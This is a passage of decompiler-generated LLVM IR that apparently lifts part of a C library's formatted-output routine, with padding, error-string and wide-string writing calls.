  store i32 %v1_804ed77, i32* @edi, align 4
  %v1_804ed7e = add i32 %v0_804eab0.lcssa, 205
  %v2_804ed7e = inttoptr i32 %v1_804ed7e to i8*
  store i8 0, i8* %v2_804ed7e, align 1
  %v0_804ed86 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed86 = trunc i32 %v0_804ed86 to i8
  %v2_804ed86 = load i32, i32* @esp, align 4
  %v3_804ed86 = add i32 %v2_804ed86, 204
  %v4_804ed86 = inttoptr i32 %v3_804ed86 to i8*
  store i8 %v1_804ed86, i8* %v4_804ed86, align 1
  br label %dec_label_pc_804edce

dec_label_pc_804ed8f:                             ; preds = %dec_label_pc_804ed32
  %v1_804ed8f = add i32 %v3_804eab0, -20
  %v9_804ed8f = icmp eq i32 %v1_804ed8f, 0
  %v10_804ed8f = icmp slt i32 %v1_804ed8f, 0
  store i1 %v10_804ed8f, i1* %sf.global-to-local, align 1
  %v1_804ed92 = icmp eq i1 %v9_804ed8f, false
  br i1 %v1_804ed92, label %dec_label_pc_804ef33, label %dec_label_pc_804ed98

dec_label_pc_804ed98:                             ; preds = %dec_label_pc_804ed8f
  %v0_804ed98 = load i32, i32* %stack_var_-364, align 4
  %v1_804ed98 = call i32 @__errno_location(i32 %v0_804ed98)
  store i32 %v1_804ed98, i32* %eax.global-to-local, align 4
  %v0_804ed9d = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed9d = load i32, i32* @esp, align 4
  %v2_804ed9d = add i32 %v1_804ed9d, -4
  %v3_804ed9d = inttoptr i32 %v2_804ed9d to i32*
  store i32 %v0_804ed9d, i32* %v3_804ed9d, align 4
  %v1_804ed9e = add i32 %v1_804ed9d, -8
  %v2_804ed9e = inttoptr i32 %v1_804ed9e to i32*
  store i32 128, i32* %v2_804ed9e, align 4
  %v1_804eda3 = add i32 %v1_804ed9d, 204
  store i32 %v1_804eda3, i32* %edx.global-to-local, align 4
  %v2_804edaa = add i32 %v1_804ed9d, -12
  %v3_804edaa = inttoptr i32 %v2_804edaa to i32*
  store i32 %v1_804eda3, i32* %v3_804edaa, align 4
  %v1_804edab = inttoptr i32 %v1_804ed98 to i32*
  %v2_804edab = load i32, i32* %v1_804edab, align 4
  %v4_804edab = add i32 %v1_804ed9d, -16
  %v5_804edab = inttoptr i32 %v4_804edab to i32*
  store i32 %v2_804edab, i32* %v5_804edab, align 4
  %v0_804edad = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804edad, i32* %eax.global-to-local, align 4
  %v0_804edb2 = load i32, i32* @esp, align 4
  %v1_804edb2 = add i32 %v0_804edb2, 16
  %v7_804edb2 = icmp slt i32 %v1_804edb2, 0
  store i1 %v7_804edb2, i1* %sf.global-to-local, align 1
  store i32 %v0_804edad, i32* @edi, align 4
  br label %dec_label_pc_804ed46

dec_label_pc_804edb9:                             ; preds = %dec_label_pc_804ec3a, %dec_label_pc_804ec33, %dec_label_pc_804ec20
  %v0_804edd634 = phi i32 [ %v1_804ebc9, %dec_label_pc_804ec3a ], [ 0, %dec_label_pc_804ec33 ], [ 5, %dec_label_pc_804ec20 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804edd3

dec_label_pc_804edbd:                             ; preds = %dec_label_pc_804ed40, %dec_label_pc_804ecb2
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805365e.103 to i32), i32* @edi, align 4
  br label %dec_label_pc_804edce

dec_label_pc_804edce:                             ; preds = %dec_label_pc_804ed69, %dec_label_pc_804ed60, %dec_label_pc_804ecf4, %dec_label_pc_804edbd
  %v0_804edce = load i32, i32* @esp, align 4
  %v1_804edce = add i32 %v0_804edce, 7
  %v2_804edce = inttoptr i32 %v1_804edce to i8*
  store i8 32, i8* %v2_804edce, align 1
  %v0_804edd6.pre = load i32, i32* @esi, align 4
  %v1_804edd6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804edd3

dec_label_pc_804edd3:                             ; preds = %dec_label_pc_804edb9, %dec_label_pc_804ec42, %dec_label_pc_804edce
  %v1_804edd6 = phi i32 [ 0, %dec_label_pc_804edb9 ], [ %v2_804ec3a, %dec_label_pc_804ec42 ], [ %v1_804edd6.pre, %dec_label_pc_804edce ]
  %v0_804edd6 = phi i32 [ %v0_804edd634, %dec_label_pc_804edb9 ], [ %v1_804ebc9, %dec_label_pc_804ec42 ], [ %v0_804edd6.pre, %dec_label_pc_804edce ]
  %v0_804edd3 = load i32, i32* @ebp, align 4
  %v1_804edd3 = add i32 %v0_804edd3, -11
  %v9_804edd3 = icmp eq i32 %v1_804edd3, 0
  %v10_804edd3 = icmp slt i32 %v1_804edd3, 0
  store i1 %v10_804edd3, i1* %sf.global-to-local, align 1
  %v2_804edd6 = add i32 %v0_804edd6, %v1_804edd6
  store i32 %v2_804edd6, i32* @edx, align 4
  br i1 %v9_804edd3, label %dec_label_pc_804ede7, label %dec_label_pc_804eddb

dec_label_pc_804eddb:                             ; preds = %dec_label_pc_804edd3
  %v1_804eddd = add i32 %v0_804edd3, -5
  %v6_804eddd = sub i32 4, %v0_804edd3
  %v7_804eddd = and i32 %v6_804eddd, %v0_804edd3
  %v8_804eddd = icmp slt i32 %v7_804eddd, 0
  %v9_804eddd = icmp eq i32 %v1_804eddd, 0
  %v10_804eddd = icmp slt i32 %v1_804eddd, 0
  store i1 %v10_804eddd, i1* %sf.global-to-local, align 1
  %v3_804ede0 = icmp eq i1 %v10_804eddd, %v8_804eddd
  %v4_804ede0 = icmp eq i1 %v9_804eddd, false
  %v5_804ede0 = and i1 %v4_804ede0, %v3_804ede0
  %v6_804ede0 = zext i1 %v5_804ede0 to i32
  store i32 %v6_804ede0, i32* %eax.global-to-local, align 4
  %v2_804ede3 = add i32 %v2_804edd6, 1
  %v3_804ede3 = add i32 %v2_804ede3, %v6_804ede0
  store i32 %v3_804ede3, i32* @edx, align 4
  br label %dec_label_pc_804ede7

dec_label_pc_804ede7:                             ; preds = %dec_label_pc_804edd3, %dec_label_pc_804eddb
  %v0_804ede7 = load i32, i32* @esp, align 4
  %v1_804ede7 = add i32 %v0_804ede7, 24
  %v2_804ede7 = inttoptr i32 %v1_804ede7 to i32*
  %v3_804ede7 = load i32, i32* %v2_804ede7, align 4
  store i32 %v3_804ede7, i32* %eax.global-to-local, align 4
  %v1_804edeb = add i32 %v0_804ede7, 8
  %v2_804edeb = inttoptr i32 %v1_804edeb to i32*
  store i32 0, i32* %v2_804edeb, align 4
  %v0_804edf3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804edf3 = load i32, i32* @edx, align 4
  %v2_804edf3 = sub i32 %v0_804edf3, %v1_804edf3
  %v7_804edf3 = icmp ult i32 %v0_804edf3, %v1_804edf3
  %v12_804edf3 = icmp eq i32 %v2_804edf3, 0
  %v13_804edf3 = icmp slt i32 %v2_804edf3, 0
  store i1 %v13_804edf3, i1* %sf.global-to-local, align 1
  %v2_804edf5 = or i1 %v7_804edf3, %v12_804edf3
  br i1 %v2_804edf5, label %dec_label_pc_804edfd, label %dec_label_pc_804edf7

dec_label_pc_804edf7:                             ; preds = %dec_label_pc_804ede7
  store i1 %v13_804edf3, i1* %sf.global-to-local, align 1
  store i32 %v2_804edf3, i32* %eax.global-to-local, align 4
  %v1_804edf9 = load i32, i32* @esp, align 4
  %v2_804edf9 = add i32 %v1_804edf9, 8
  %v3_804edf9 = inttoptr i32 %v2_804edf9 to i32*
  store i32 %v2_804edf3, i32* %v3_804edf9, align 4
  %v0_804ee01.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804edfd

dec_label_pc_804edfd:                             ; preds = %dec_label_pc_804ede7, %dec_label_pc_804edf7
  %v0_804ee01 = phi i32 [ %v1_804edf3, %dec_label_pc_804ede7 ], [ %v0_804ee01.pre, %dec_label_pc_804edf7 ]
  %v0_804edfd = load i32, i32* @esp, align 4
  %v1_804edfd = add i32 %v0_804edfd, 8
  %v2_804edfd = inttoptr i32 %v1_804edfd to i32*
  %v3_804edfd = load i32, i32* %v2_804edfd, align 4
  store i32 %v3_804edfd, i32* @ecx, align 4
  %v2_804ee01 = add i32 %v3_804edfd, %v0_804ee01
  store i32 %v2_804ee01, i32* %eax.global-to-local, align 4
  %v1_804ee04 = inttoptr i32 %v0_804edfd to i32*
  %v2_804ee04 = load i32, i32* %v1_804ee04, align 4
  %v4_804ee04 = add i32 %v2_804ee04, %v2_804ee01
  %v15_804ee04 = icmp slt i32 %v4_804ee04, 0
  store i1 %v15_804ee04, i1* %sf.global-to-local, align 1
  store i32 %v4_804ee04, i32* %v1_804ee04, align 4
  %v0_804ee07 = load i32, i32* @esp, align 4
  %v1_804ee07 = add i32 %v0_804ee07, 7
  %v2_804ee07 = inttoptr i32 %v1_804ee07 to i8*
  %v3_804ee07 = load i8, i8* %v2_804ee07, align 1
  %v4_804ee07 = add i8 %v3_804ee07, -48
  %v9_804ee07 = icmp eq i8 %v4_804ee07, 0
  %v10_804ee07 = icmp slt i8 %v4_804ee07, 0
  store i1 %v10_804ee07, i1* %sf.global-to-local, align 1
  %v1_804ee0c = icmp eq i1 %v9_804ee07, false
  br i1 %v1_804ee0c, label %dec_label_pc_804ee18, label %dec_label_pc_804ee0e

dec_label_pc_804ee0e:                             ; preds = %dec_label_pc_804edfd
  %v0_804ee0e = load i32, i32* @ebx, align 4
  %v1_804ee0e = load i32, i32* @ecx, align 4
  %v2_804ee0e = add i32 %v1_804ee0e, %v0_804ee0e
  %v13_804ee0e = icmp slt i32 %v2_804ee0e, 0
  store i1 %v13_804ee0e, i1* %sf.global-to-local, align 1
  store i32 %v2_804ee0e, i32* @ebx, align 4
  %v1_804ee10 = add i32 %v0_804ee07, 8
  %v2_804ee10 = inttoptr i32 %v1_804ee10 to i32*
  store i32 0, i32* %v2_804ee10, align 4
  %v0_804ee18.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ee18

dec_label_pc_804ee18:                             ; preds = %dec_label_pc_804edfd, %dec_label_pc_804ee0e
  %v0_804ee1f = phi i32 [ %v0_804ee07, %dec_label_pc_804edfd ], [ %v0_804ee18.pre, %dec_label_pc_804ee0e ]
  %v1_804ee18 = add i32 %v0_804ee1f, 32
  %v2_804ee18 = inttoptr i32 %v1_804ee18 to i8*
  %v3_804ee18 = load i8, i8* %v2_804ee18, align 1
  %v4_804ee18 = and i8 %v3_804ee18, 8
  %v5_804ee18 = icmp eq i8 %v4_804ee18, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804ee1d = icmp eq i1 %v5_804ee18, false
  br i1 %v1_804ee1d, label %dec_label_pc_804ee46, label %dec_label_pc_804ee1f

dec_label_pc_804ee1f:                             ; preds = %dec_label_pc_804ee18
  %v1_804ee1f = add i32 %v0_804ee1f, 8
  %v2_804ee1f = inttoptr i32 %v1_804ee1f to i32*
  %v3_804ee1f = load i32, i32* %v2_804ee1f, align 4
  store i32 %v3_804ee1f, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ee28 = add i32 %v0_804ee1f, 368
  %v2_804ee28 = inttoptr i32 %v1_804ee28 to i32*
  %v3_804ee28 = load i32, i32* %v2_804ee28, align 4
  store i32 %v3_804ee28, i32* @eax, align 4
  %v0_804ee2f = call i32 @_charpad()
  store i32 %v0_804ee2f, i32* %eax.global-to-local, align 4
  %v1_804ee34 = load i32, i32* @esp, align 4
  %v2_804ee34 = add i32 %v1_804ee34, 8
  %v3_804ee34 = inttoptr i32 %v2_804ee34 to i32*
  %v4_804ee34 = load i32, i32* %v3_804ee34, align 4
  %v5_804ee34 = sub i32 %v0_804ee2f, %v4_804ee34
  %v15_804ee34 = icmp eq i32 %v5_804ee34, 0
  %v16_804ee34 = icmp slt i32 %v5_804ee34, 0
  store i1 %v16_804ee34, i1* %sf.global-to-local, align 1
  %v1_804ee38 = icmp eq i1 %v15_804ee34, false
  br i1 %v1_804ee38, label %dec_label_pc_804ef33, label %dec_label_pc_804ee3e

dec_label_pc_804ee3e:                             ; preds = %dec_label_pc_804ee1f
  store i32 0, i32* %v3_804ee34, align 4
  %v1_804ee46.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ee46

dec_label_pc_804ee46:                             ; preds = %dec_label_pc_804ee18, %dec_label_pc_804ee3e
  %v1_804ee46 = phi i32 [ %v0_804ee1f, %dec_label_pc_804ee18 ], [ %v1_804ee46.pre, %dec_label_pc_804ee3e ]
  %v0_804ee46 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ee46 = add i32 %v1_804ee46, -4
  %v3_804ee46 = inttoptr i32 %v2_804ee46 to i32*
  store i32 %v0_804ee46, i32* %v3_804ee46, align 4
  %v0_804ee47 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ee47 = add i32 %v1_804ee46, -8
  %v3_804ee47 = inttoptr i32 %v2_804ee47 to i32*
  store i32 %v0_804ee47, i32* %v3_804ee47, align 4
  %v1_804ee48 = add i32 %v1_804ee46, 368
  %v2_804ee48 = inttoptr i32 %v1_804ee48 to i32*
  %v3_804ee48 = load i32, i32* %v2_804ee48, align 4
  %v5_804ee48 = add i32 %v1_804ee46, -12
  %v6_804ee48 = inttoptr i32 %v5_804ee48 to i32*
  store i32 %v3_804ee48, i32* %v6_804ee48, align 4
  %v0_804ee4f = load i32, i32* @ebp, align 4
  %v1_804ee4f = add i32 %v0_804ee4f, ptrtoint (i32* @global_var_8053665.104 to i32)
  store i32 %v1_804ee4f, i32* %eax.global-to-local, align 4
  %v2_804ee55 = add i32 %v1_804ee46, -16
  %v3_804ee55 = inttoptr i32 %v2_804ee55 to i32*
  store i32 %v1_804ee4f, i32* %v3_804ee55, align 4
  %v0_804ee56 = load i32, i32* %stack_var_-364, align 4
  %v4_804ee56 = inttoptr i32 %v0_804ee56 to i8*
  %v5_804ee56 = call i32 @__GI_fputs_unlocked(i8* %v4_804ee56, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ee56, i32* %eax.global-to-local, align 4
  %v0_804ee5b = load i32, i32* @esp, align 4
  %v1_804ee5b = add i32 %v0_804ee5b, 384
  %v2_804ee5b = inttoptr i32 %v1_804ee5b to i32*
  %v3_804ee5b = load i32, i32* %v2_804ee5b, align 4
  store i32 %v3_804ee5b, i32* @eax, align 4
  %v0_804ee62 = load i32, i32* @ebx, align 4
  store i32 %v0_804ee62, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804ee69 = call i32 @_charpad()
  store i32 %v0_804ee69, i32* %eax.global-to-local, align 4
  %v0_804ee6e = load i32, i32* @esp, align 4
  %v1_804ee6e = add i32 %v0_804ee6e, 16
  %v1_804ee71 = load i32, i32* @ebx, align 4
  %v2_804ee71 = sub i32 %v0_804ee69, %v1_804ee71
  %v12_804ee71 = icmp eq i32 %v2_804ee71, 0
  %v13_804ee71 = icmp slt i32 %v2_804ee71, 0
  store i1 %v13_804ee71, i1* %sf.global-to-local, align 1
  %v1_804ee73 = icmp eq i1 %v12_804ee71, false
  br i1 %v1_804ee73, label %dec_label_pc_804ef33, label %dec_label_pc_804ee79

dec_label_pc_804ee79:                             ; preds = %dec_label_pc_804ee46
  %v1_804ee79 = add i32 %v0_804ee6e, 356
  %v2_804ee79 = inttoptr i32 %v1_804ee79 to i32*
  %v3_804ee79 = load i32, i32* %v2_804ee79, align 4
  %v4_804ee79 = icmp eq i32 %v3_804ee79, 0
  %v5_804ee79 = icmp slt i32 %v3_804ee79, 0
  store i1 %v5_804ee79, i1* %sf.global-to-local, align 1
  %v1_804ee81 = icmp eq i1 %v4_804ee79, false
  br i1 %v1_804ee81, label %dec_label_pc_804eea5, label %dec_label_pc_804ee83

dec_label_pc_804ee83:                             ; preds = %dec_label_pc_804ee79
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804ee85 = load i32, i32* @esi, align 4
  %v1_804ee85 = icmp eq i32 %v0_804ee85, 0
  %v2_804ee85 = icmp slt i32 %v0_804ee85, 0
  store i1 %v2_804ee85, i1* %sf.global-to-local, align 1
  br i1 %v1_804ee85, label %dec_label_pc_804ee9b, label %dec_label_pc_804ee89

dec_label_pc_804ee89:                             ; preds = %dec_label_pc_804ee83
  %v2_804ee89 = add i32 %v0_804ee6e, 12
  %v3_804ee89 = inttoptr i32 %v2_804ee89 to i32*
  store i32 0, i32* %v3_804ee89, align 4
  %v1_804ee8a = add i32 %v0_804ee6e, 384
  %v2_804ee8a = inttoptr i32 %v1_804ee8a to i32*
  %v3_804ee8a = load i32, i32* %v2_804ee8a, align 4
  %v5_804ee8a = add i32 %v0_804ee6e, 8
  %v6_804ee8a = inttoptr i32 %v5_804ee8a to i32*
  store i32 %v3_804ee8a, i32* %v6_804ee8a, align 4
  %v0_804ee91 = load i32, i32* @esi, align 4
  %v2_804ee91 = add i32 %v0_804ee6e, 4
  %v3_804ee91 = inttoptr i32 %v2_804ee91 to i32*
  store i32 %v0_804ee91, i32* %v3_804ee91, align 4
  %v0_804ee92 = load i32, i32* @edi, align 4
  %v3_804ee92 = inttoptr i32 %v0_804ee6e to i32*
  store i32 %v0_804ee92, i32* %v3_804ee92, align 4
  %v0_804ee93 = load i32, i32* %stack_var_-364, align 4
  %v4_804ee93 = call i32 @__stdio_fwrite(i32 %v0_804ee93, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ee93, i32* %eax.global-to-local, align 4
  %v0_804ee98 = load i32, i32* @esp, align 4
  %v1_804ee98 = add i32 %v0_804ee98, 16
  %v7_804ee98 = icmp slt i32 %v1_804ee98, 0
  store i1 %v7_804ee98, i1* %sf.global-to-local, align 1
  %v1_804ee9b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ee9b

dec_label_pc_804ee9b:                             ; preds = %dec_label_pc_804ee83, %dec_label_pc_804ee89
  %v0_804ef0546 = phi i32 [ %v1_804ee6e, %dec_label_pc_804ee83 ], [ %v1_804ee98, %dec_label_pc_804ee89 ]
  %v1_804ee9b = phi i32 [ 0, %dec_label_pc_804ee83 ], [ %v1_804ee9b.pre, %dec_label_pc_804ee89 ]
  %v0_804ee9b = phi i32 [ 0, %dec_label_pc_804ee83 ], [ %v4_804ee93, %dec_label_pc_804ee89 ]
  %v2_804ee9b = sub i32 %v0_804ee9b, %v1_804ee9b
  %v12_804ee9b = icmp eq i32 %v2_804ee9b, 0
  %v13_804ee9b = icmp slt i32 %v2_804ee9b, 0
  store i1 %v13_804ee9b, i1* %sf.global-to-local, align 1
  %v1_804ee9d = icmp eq i1 %v12_804ee9b, false
  br i1 %v1_804ee9d, label %dec_label_pc_804ef33, label %dec_label_pc_804ef05

dec_label_pc_804eea5:                             ; preds = %dec_label_pc_804ee79
  %v1_804eea5 = add i32 %v0_804ee6e, 348
  %v2_804eea5 = inttoptr i32 %v1_804eea5 to i32*
  store i32 0, i32* %v2_804eea5, align 4
  %v0_804ef018 = load i32, i32* @esi, align 4
  %v1_804ef019 = icmp eq i32 %v0_804ef018, 0
  %v2_804ef0110 = icmp slt i32 %v0_804ef018, 0
  store i1 %v2_804ef0110, i1* %sf.global-to-local, align 1
  %v1_804ef0316 = icmp eq i1 %v1_804ef019, false
  %v0_804eeb2.pre = load i32, i32* @esp, align 4
  br i1 %v1_804ef0316, label %dec_label_pc_804eeb2, label %dec_label_pc_804ef05

dec_label_pc_804eeb2:                             ; preds = %dec_label_pc_804eea5, %dec_label_pc_804eeff
  %v0_804eeb9 = phi i32 [ %v2_804eeff, %dec_label_pc_804eeff ], [ %v0_804ef018, %dec_label_pc_804eea5 ]
  %v1_804eec4 = phi i32 [ %v0_804eeb241, %dec_label_pc_804eeff ], [ %v0_804eeb2.pre, %dec_label_pc_804eea5 ]
  %v1_804eeb2 = add i32 %v1_804eec4, 332
  store i32 %v1_804eeb2, i32* %edx.global-to-local, align 4
  %v1_804eeb9 = add i32 %v0_804eeb9, -128
  %v2_804eeb9 = icmp ult i32 %v0_804eeb9, 128
  %v6_804eeb9 = icmp eq i32 %v1_804eeb9, 0
  %v7_804eeb9 = icmp slt i32 %v1_804eeb9, 0
  store i1 %v7_804eeb9, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804eec4 = add i32 %v1_804eec4, -4
  %v3_804eec4 = inttoptr i32 %v2_804eec4 to i32*
  store i32 %v1_804eeb2, i32* %v3_804eec4, align 4
  %v2_804eec5 = or i1 %v2_804eeb9, %v6_804eeb9
  %v3_804eec5 = load i32, i32* %eax.global-to-local, align 4
  %v4_804eec5 = load i32, i32* @esi, align 4
  %v5_804eec5 = select i1 %v2_804eec5, i32 %v4_804eec5, i32 %v3_804eec5
  %v2_804eec8 = add i32 %v1_804eec4, -8
  %v3_804eec8 = inttoptr i32 %v2_804eec8 to i32*
  store i32 %v5_804eec5, i32* %v3_804eec8, align 4
  %v1_804eec9 = add i32 %v1_804eec4, 340
  store i32 %v1_804eec9, i32* %eax.global-to-local, align 4
  %v2_804eed0 = add i32 %v1_804eec4, -12
  %v3_804eed0 = inttoptr i32 %v2_804eed0 to i32*
  store i32 %v1_804eec9, i32* %v3_804eed0, align 4
  %v1_804eed1 = add i32 %v1_804eec4, 204
  store i32 %v1_804eed1, i32* @edi, align 4
  %v2_804eed8 = add i32 %v1_804eec4, -16
  %v3_804eed8 = inttoptr i32 %v2_804eed8 to i32*
  store i32 %v1_804eed1, i32* %v3_804eed8, align 4
  %v0_804eed9 = call i32 @__GI_wcsrtombs()
  %v0_804eede = load i32, i32* @esp, align 4
  %v1_804eede = add i32 %v0_804eede, 16
  store i32 %v0_804eed9, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804eee5 = icmp eq i32 %v0_804eed9, 0
  %v2_804eee5 = icmp slt i32 %v0_804eed9, 0
  store i1 %v2_804eee5, i1* %sf.global-to-local, align 1
  br i1 %v1_804eee5, label %dec_label_pc_804eefb, label %dec_label_pc_804eee9

dec_label_pc_804eee9:                             ; preds = %dec_label_pc_804eeb2
  %v0_804eee9 = load i32, i32* @ebp, align 4
  %v2_804eee9 = add i32 %v0_804eede, 12
  %v3_804eee9 = inttoptr i32 %v2_804eee9 to i32*
  store i32 %v0_804eee9, i32* %v3_804eee9, align 4
  %v1_804eeea = add i32 %v0_804eede, 384
  %v2_804eeea = inttoptr i32 %v1_804eeea to i32*
  %v3_804eeea = load i32, i32* %v2_804eeea, align 4
  %v5_804eeea = add i32 %v0_804eede, 8
  %v6_804eeea = inttoptr i32 %v5_804eeea to i32*
  store i32 %v3_804eeea, i32* %v6_804eeea, align 4
  %v2_804eef1 = add i32 %v0_804eede, 4
  %v3_804eef1 = inttoptr i32 %v2_804eef1 to i32*
  store i32 %v0_804eed9, i32* %v3_804eef1, align 4
  %v0_804eef2 = load i32, i32* @edi, align 4
  %v3_804eef2 = inttoptr i32 %v0_804eede to i32*
  store i32 %v0_804eef2, i32* %v3_804eef2, align 4
  %v0_804eef3 = load i32, i32* %stack_var_-364, align 4
  %v4_804eef3 = call i32 @__stdio_fwrite(i32 %v0_804eef3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804eef3, i32* %eax.global-to-local, align 4
  %v0_804eef8 = load i32, i32* @esp, align 4
  %v1_804eef8 = add i32 %v0_804eef8, 16
  %v7_804eef8 = icmp slt i32 %v1_804eef8, 0
  store i1 %v7_804eef8, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804eefb

dec_label_pc_804eefb:                             ; preds = %dec_label_pc_804eeb2, %dec_label_pc_804eee9
  %v1_804eeff = phi i32 [ 0, %dec_label_pc_804eeb2 ], [ %v4_804eef3, %dec_label_pc_804eee9 ]
  %v0_804eeb241 = phi i32 [ %v1_804eede, %dec_label_pc_804eeb2 ], [ %v1_804eef8, %dec_label_pc_804eee9 ]
  %v2_804eefb = sub i32 %v1_804eeff, %v0_804eed9
  %v12_804eefb = icmp eq i32 %v2_804eefb, 0
  %v13_804eefb = icmp slt i32 %v2_804eefb, 0
  store i1 %v13_804eefb, i1* %sf.global-to-local, align 1
  %v1_804eefd = icmp eq i1 %v12_804eefb, false
  br i1 %v1_804eefd, label %dec_label_pc_804ef33, label %dec_label_pc_804eeff

dec_label_pc_804eeff:                             ; preds = %dec_label_pc_804eefb
  %v0_804eeff = load i32, i32* @esi, align 4
  %v2_804eeff = sub i32 %v0_804eeff, %v1_804eeff
  %v12_804eeff = icmp eq i32 %v2_804eeff, 0
  %v13_804eeff = icmp slt i32 %v2_804eeff, 0
  store i32 %v2_804eeff, i32* @esi, align 4
  store i1 %v13_804eeff, i1* %sf.global-to-local, align 1
  %v1_804ef03 = icmp eq i1 %v12_804eeff, false
  br i1 %v1_804ef03, label %dec_label_pc_804eeb2, label %dec_label_pc_804ef05

dec_label_pc_804ef05:                             ; preds = %dec_label_pc_804eeff, %dec_label_pc_804eea5, %dec_label_pc_804ee9b
  %v0_804ef05 = phi i32 [ %v0_804ef0546, %dec_label_pc_804ee9b ], [ %v0_804eeb2.pre, %dec_label_pc_804eea5 ], [ %v0_804eeb241, %dec_label_pc_804eeff ]
  %v1_804ef05 = add i32 %v0_804ef05, 8
  %v2_804ef05 = inttoptr i32 %v1_804ef05 to i32*
  %v3_804ef05 = load i32, i32* %v2_804ef05, align 4
  store i32 %v3_804ef05, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ef0e = add i32 %v0_804ef05, 368
  %v2_804ef0e = inttoptr i32 %v1_804ef0e to i32*
  %v3_804ef0e = load i32, i32* %v2_804ef0e, align 4
  store i32 %v3_804ef0e, i32* @eax, align 4
  %v0_804ef15 = call i32 @_charpad()
  store i32 %v0_804ef15, i32* %eax.global-to-local, align 4
  %v1_804ef1a = load i32, i32* @esp, align 4
  %v2_804ef1a = add i32 %v1_804ef1a, 8
  %v3_804ef1a = inttoptr i32 %v2_804ef1a to i32*
  %v4_804ef1a = load i32, i32* %v3_804ef1a, align 4
  %v5_804ef1a = sub i32 %v0_804ef15, %v4_804ef1a
  %v15_804ef1a = icmp eq i32 %v5_804ef1a, 0
  %v16_804ef1a = icmp slt i32 %v5_804ef1a, 0
  store i1 %v16_804ef1a, i1* %sf.global-to-local, align 1
  %v1_804ef1e = icmp eq i1 %v15_804ef1a, false
  br i1 %v1_804ef1e, label %dec_label_pc_804ef33, label %dec_label_pc_804ef20

dec_label_pc_804ef20:                             ; preds = %dec_label_pc_804ef05, %dec_label_pc_804ec8d, %dec_label_pc_804eab8
  %v0_804ef20 = phi i32 [ %v1_804ef1a, %dec_label_pc_804ef05 ], [ %v0_804ef20.pre, %dec_label_pc_804ec8d ], [ %v1_804ead6, %dec_label_pc_804eab8 ]
  %v1_804ef20 = add i32 %v0_804ef20, 16
  %v2_804ef20 = inttoptr i32 %v1_804ef20 to i32*
  %v3_804ef20 = load i32, i32* %v2_804ef20, align 4
  store i32 %v3_804ef20, i32* @ebx, align 4
  store i32 %v3_804ef20, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ea10.backedge

dec_label_pc_804ef2b:                             ; preds = %dec_label_pc_804ea4e
  %v1_804ef2b = add i32 %v0_804ef2b, 2
  %v10_804ef2b = icmp slt i32 %v1_804ef2b, 0
  store i1 %v10_804ef2b, i1* %sf.global-to-local, align 1
  store i32 %v1_804ef2b, i32* @ebx, align 4
  br label %dec_label_pc_804ea10.backedge

dec_label_pc_804ef33:                             ; preds = %dec_label_pc_804ea3a, %dec_label_pc_804ef05, %dec_label_pc_804ee9b, %dec_label_pc_804ee46, %dec_label_pc_804ee1f, %dec_label_pc_804ed8f, %dec_label_pc_804ed02, %dec_label_pc_804ecc3, %dec_label_pc_804ec64, %dec_label_pc_804eefb
  %v0_804ef33 = phi i32 [ %v0_804eeb241, %dec_label_pc_804eefb ], [ %v0_804ef33.pre.pre, %dec_label_pc_804ea3a ], [ %v1_804ef1a, %dec_label_pc_804ef05 ], [ %v0_804ef0546, %dec_label_pc_804ee9b ], [ %v1_804ee6e, %dec_label_pc_804ee46 ], [ %v1_804ee34, %dec_label_pc_804ee1f ], [ %v0_804eab0.lcssa, %dec_label_pc_804ed8f ], [ %v1_804ed1a, %dec_label_pc_804ed02 ], [ %v1_804ece6, %dec_label_pc_804ecc3 ], [ %v1_804ec82, %dec_label_pc_804ec64 ]
  %v1_804ef33 = inttoptr i32 %v0_804ef33 to i32*
  store i32 -1, i32* %v1_804ef33, align 4
  br label %dec_label_pc_804ef3a

dec_label_pc_804ef3a:                             ; preds = %dec_label_pc_804ea45, %dec_label_pc_804e9b3, %dec_label_pc_804e9d2, %dec_label_pc_804ef33
  %v0_804ef3a = load i32, i32* @esp, align 4
  %v1_804ef3a = inttoptr i32 %v0_804ef3a to i32*
  %v2_804ef3a = load i32, i32* %v1_804ef3a, align 4
  store i32 %v2_804ef3a, i32* %eax.global-to-local, align 4
  %v1_804ef3d = add i32 %v0_804ef3a, 348
  %v10_804ef3d = icmp slt i32 %v1_804ef3d, 0
  store i1 %v10_804ef3d, i1* %sf.global-to-local, align 1
  ret i32 %v2_804ef3a

; uselistorder directives
  uselistorder i32 %v1_804ef2b, { 1, 2, 0 }
  uselistorder i32 %v3_804ef20, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804ef05, { 1, 0 }
  uselistorder i32 %v2_804eeff, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804eede, { 4, 0, 1, 2, 3, 5 }
